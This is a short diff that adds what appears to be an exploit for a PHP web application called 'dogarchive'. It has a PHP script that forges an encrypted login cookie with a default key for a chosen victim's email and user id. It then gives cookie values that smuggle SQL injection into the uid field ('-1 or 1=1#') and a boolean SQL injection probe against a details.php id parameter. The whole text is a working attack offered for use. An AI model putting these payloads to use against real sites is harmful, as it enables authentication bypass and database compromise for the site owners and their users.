@@ -1,0 +1,25 @@
+&lt;?php
+
+//Configure [real_email] and [real_uid] with your target
+
+$COOKIE_KEY=&quot;somethingRAndoM9871234whateveryoulike&quot;; //user.conf by default
+$cookie=&quot;email=&quot;.urlencode(&#039;[real_email]&#039;).&quot;&amp;uid=[real_uid]&amp;seclev=1&quot;;
+$iv = mcrypt_create_iv(mcrypt_get_iv_size (MCRYPT_BLOWFISH, MCRYPT_MODE_ECB), MCRYPT_RAND);
+$cookie = base64_encode(mcrypt_encrypt (MCRYPT_BLOWFISH, $COOKIE_KEY, $cookie, MCRYPT_MODE_ECB, $iv));
+print &quot;Cookie crypted-urlencode --&gt;&quot;.urlencode($cookie).&quot;\n&quot;;
+
+?&gt;
+
+Add cookie --&gt; Name ~&gt; dogarchive_user_info
+
+           --&gt; Value ~&gt; email=[real_email]&amp;uid=[real_uid]&amp;seclev=1
+
+Add cookie --&gt; Name ~&gt; dogarchive_user_info
+
+           --&gt; Value ~&gt; Use PHP script above
+
+Add cookie --&gt; Name ~&gt; dogarchive_user_info
+
+           --&gt; Value ~&gt; email=&amp;uid=-1%20or%201=1#&amp;seclev=
+
+http://www.example.com/[HOME_PATH]/details.php?id=63174+and+1=1%23  --&gt; True
